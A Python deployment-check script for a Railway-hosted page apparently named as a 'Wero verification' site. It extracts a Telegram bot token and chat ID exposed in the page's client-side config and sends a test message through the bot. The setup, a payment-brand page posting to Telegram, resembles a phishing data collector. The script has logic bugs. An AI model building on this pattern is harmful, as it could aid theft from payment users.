import requests
import re
from datetime import datetime

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

print("=" * 70)
print("WERO TELEGRAM - VERIFICATION DE L'INJECTION DES TOKENS")
print("=" * 70)
print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}")
print()

# Fetch the page
print("[1/4] Fetching test page from Railway...")
try:
    response = requests.get(TEST_PAGE, timeout=10)
    print(f"[OK] Status: {response.status_code}")
except Exception as e:
    print(f"[ERROR] {e}")
    exit(1)

print()
print("[2/4] Checking for Telegram config in HTML...")

# Look for the config
config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
match = re.search(config_pattern, response.text, re.DOTALL)

if match:
    config_content = match.group(1)
    print("[OK] Config found!")
    print()
    
    # Extract BOT_TOKEN
    bot_token_match = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', config_content)
    if bot_token_match:
        bot_token = bot_token_match.group(1)
        print(f"BOT_TOKEN: {bot_token}")
        
        if bot_token == "TELEGRAM_BOT_TOKEN_PLACEHOLDER":
            print("  [WARNING] Token is still a PLACEHOLDER - not injected yet!")
            print("  This means Railway might not have redeployed yet")
        else:
            print(f"  [OK] Token injected! Length: {len(bot_token)} chars")
            print(f"  First 10 chars: {bot_token[:10]}")
            print(f"  Last 10 chars: {bot_token[-10:]}")
    
    # Extract CHAT_ID
    chat_id_match = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', config_content)
    if chat_id_match:
        chat_id = chat_id_match.group(1)
        print(f"CHAT_ID: {chat_id}")
        
        if chat_id == "TELEGRAM_CHAT_ID_PLACEHOLDER":
            print("  [WARNING] Chat ID is still a PLACEHOLDER!")
        else:
            print(f"  [OK] Chat ID injected!")
else:
    print("[ERROR] Config NOT found in HTML!")
    print("This might mean:")
    print("  1. Railway hasn't redeployed yet")
    print("  2. The entrypoint.sh didn't run properly")
    print("  3. The nginx path is wrong in entrypoint.sh")

print()
print("[3/4] Testing if page has Telegram send functionality...")

if "fetch('https://api.telegram.org/bot'" in response.text or \
   'fetch("https://api.telegram.org/bot"' in response.text or \
   'api.telegram.org' in response.text:
    print("[OK] Telegram API call logic found")
else:
    print("[WARNING] No Telegram API call logic found")

print()
print("[4/4] Summary")
print("=" * 70)

# Now test if we can actually send via Telegram
if bot_token and bot_token != "TELEGRAM_BOT_TOKEN_PLACEHOLDER" and \
   chat_id and chat_id != "TELEGRAM_CHAT_ID_PLACEHOLDER":
    
    print()
    print("Tokens are properly injected! Testing actual Telegram send...")
    print()
    
    test_message = f"""TEST WERO AUTOMATION
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Status: Configuration verified on Railway"""
    
    try:
        tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": test_message
        }
        
        print(f"Sending test message to Telegram...")
        print(f"  Chat ID: {chat_id}")
        print(f"  Message: {test_message}")
        print()
        
        tg_response = requests.post(tg_url, json=payload, timeout=10)
        tg_data = tg_response.json()
        
        if tg_data.get('ok'):
            print("[SUCCESS] Message sent to Telegram!")
            print(f"  Message ID: {tg_data['result']['message_id']}")
            print(f"  Chat: {tg_data['result']['chat']['id']}")
            print()
            print("VERIFICATION COMPLETE - ALL SYSTEMS GO!")
        else:
            print(f"[ERROR] Telegram API error: {tg_data.get('description')}")
    except Exception as e:
        print(f"[ERROR] Failed to send to Telegram: {e}")
else:
    print("[WARNING] Tokens not yet injected on Railway")
    print("Next steps:")
    print("1. Wait for Railway to complete deployment")
    print("2. Check Railway logs: https://railway.app/project/[PROJECT_ID]")
    print("3. Verify entrypoint.sh is running: 'docker build && docker run'")
    print("4. Run this script again in 30 seconds")

print()
